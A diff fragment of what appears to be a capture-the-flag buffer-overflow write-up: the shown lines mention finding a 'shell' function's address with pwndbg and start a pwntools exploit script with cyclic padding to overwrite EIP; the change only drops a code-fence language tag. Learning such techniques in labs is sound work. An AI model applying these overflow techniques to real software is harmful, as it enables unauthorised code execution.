@@ -256,7 +256,7 @@ pwndbg> disassemble shell
 
 7. Now that we know the address of the shell function and how many bytes we need before we overwrite EIP, The last piece is to write a python script to run the shell function.
 
-```Python
+```
 from pwn import *
 
 padding = cyclic(cyclic_find('laaa'))
